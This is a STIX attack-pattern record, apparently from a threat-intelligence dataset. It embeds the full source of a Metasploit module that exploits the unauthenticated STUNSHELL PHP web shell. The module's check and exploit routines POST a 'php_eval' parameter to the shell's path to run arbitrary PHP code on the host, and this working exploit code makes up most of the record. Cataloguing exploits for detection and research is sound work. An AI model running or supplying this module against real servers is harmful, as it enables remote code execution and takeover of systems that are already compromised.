{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7ae11e3-84f1-4e79-8e09-8815aa891ba7",
    "created": "2024-08-14T17:11:46.446822Z",
    "modified": "2024-08-14T17:11:46.446827Z",
    "name": "STUNSHELL Web Shell Remote PHP Code Execution",
    "description": " This module exploits unauthenticated versions of the \"STUNSHELL\" web shell. This module works when safe mode is enabled on the web server. This shell is widely used in automated RFI payloads.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/stunshell_eval.rb",
            "external_id": "stunshell_eval.rb"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'STUNSHELL Web Shell Remote PHP Code Execution',\n      'Description'    => %q{\n          This module exploits unauthenticated versions of the \"STUNSHELL\" web shell.\n        This module works when safe mode is enabled on the web server. This shell is widely\n        used in automated RFI payloads.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bwall <bwall[at]openbwall.com>' # vuln discovery & msf module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '91842'],\n          ['URL', 'https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL'],\n          ['URL', 'https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Keys'        => ['php'],\n          'Space'       => 10000,\n          'DisableNops' => true\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['stunshell', {}]\n        ],\n      'DisclosureDate' => '2013-03-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',[true, \"The path to the andalas_oku shell\", \"/IDC.php\"]),\n      ])\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path.to_s)\n    request_parameters = {\n      'method'\t=> 'POST',\n      'uri'\t\t=> uri,\n      'vars_post'\t=>\n        {\n          'cmd' => \"php_eval\",\n          'php_eval' => \"print 'andalas_oku test parameter';\"\n        }\n    }\n    shell = send_request_cgi(request_parameters)\n    if (shell and shell.body =~ /andalas_oku test parameter/)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def http_send_command(cmd)\n    uri = normalize_uri(target_uri.path.to_s)\n    request_parameters = {\n      'method'\t=> 'POST',\n      'uri'\t\t=> uri,\n      'vars_post'\t=>\n        {\n          'cmd' => \"php_eval\",\n          \"php_eval\" => cmd\n        }\n    }\n    res = send_request_cgi(request_parameters)\n  end\n\n  def exploit\n    http_send_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}